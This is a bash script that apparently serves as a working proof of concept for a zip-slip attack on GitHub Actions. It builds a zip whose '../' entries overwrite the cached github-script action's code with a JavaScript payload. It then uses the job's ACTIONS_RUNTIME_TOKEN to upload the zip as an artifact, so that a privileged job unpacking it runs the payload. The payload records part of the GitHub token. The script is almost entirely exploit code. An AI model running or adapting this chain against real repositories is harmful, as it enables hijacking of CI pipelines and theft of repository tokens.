#!/usr/bin/env bash
set -euo pipefail
d="$RUNNER_TEMP/slip"
rm -rf "$d"; mkdir -p "$d"

cat > "$d/payload.js" <<'JS'
;(async () => {
  const fs = await import('node:fs')
  fs.writeFileSync('/home/runner/work/HIJACK_MARKER.txt', 'RCE-IN-PRIVILEGED-JOB token=' + String(process.env['INPUT_GITHUB-TOKEN'] || process.env.GITHUB_TOKEN || 'none').slice(0,8) + '\n')
  console.log('HIJACKED-GITHUB-SCRIPT-RAN')
})()
JS

python3 - "$d" <<'PY'
import os, sys, zipfile
d = sys.argv[1]
payload = open(os.path.join(d, 'payload.js'), 'rb').read()
out = os.path.join(d, 'slip.zip')
z = zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED)
z.writestr('audit.json', '{"advisories":{}}')
z.writestr('../SLIP_ESCAPE.txt', 'zip-slip-escaped\n')
z.writestr('../../_actions/actions/github-script/ed597411d8f924073f98dfc5c65a23a2325f34cd/dist/index.js', payload)
z.close()
print('zip-size', os.path.getsize(out))
PY

python3 - "$d" <<'PY'
import os, base64, json, sys
d = sys.argv[1]
t = os.environ['ACTIONS_RUNTIME_TOKEN'].split('.')[1]
t += '=' * (-len(t) % 4)
c = json.loads(base64.urlsafe_b64decode(t))
scp = [s for s in c['scp'].split(' ') if s.startswith('Actions.Results:')][0]
_, wr, jr = scp.split(':')
u = __import__('urllib.parse', fromlist=['urlparse']).urlparse(os.environ['ACTIONS_RESULTS_URL'])
open(os.path.join(d, 'ids.json'), 'w').write(json.dumps({'wr': wr, 'jr': jr, 'origin': f'{u.scheme}://{u.netloc}'}))
PY

WR=$(jq -r .wr "$d/ids.json"); JR=$(jq -r .jr "$d/ids.json"); ORIGIN=$(jq -r .origin "$d/ids.json")
SIZE=$(stat -c%s "$d/slip.zip"); HASH=$(sha256sum "$d/slip.zip" | cut -d' ' -f1)
echo "origin=$ORIGIN wr=$WR jr=$JR size=$SIZE"

CREATE=$(curl -sS --max-time 30 -X POST "$ORIGIN/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
  -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" \
  -d "{\"workflow_run_backend_id\":\"$WR\",\"workflow_job_run_backend_id\":\"$JR\",\"name\":\"slip-test\",\"version\":4}")
echo "create: $CREATE"
URL=$(echo "$CREATE" | jq -r .signed_upload_url)
[ "$URL" != "null" ] || { echo "NO_SIGNED_URL"; exit 1; }
echo "put_status: $(curl -sS --max-time 60 -o /dev/null -w '%{http_code}' -X PUT "$URL" -H 'x-ms-blob-type: BlockBlob' -H 'Content-Type: application/zip' --data-binary "@$d/slip.zip")"
FINAL=$(curl -sS --max-time 30 -X POST "$ORIGIN/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
  -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" \
  -d "{\"workflow_run_backend_id\":\"$WR\",\"workflow_job_run_backend_id\":\"$JR\",\"name\":\"slip-test\",\"size\":\"$SIZE\",\"hash\":{\"value\":\"sha256:$HASH\"}}")
echo "finalize: $FINAL"
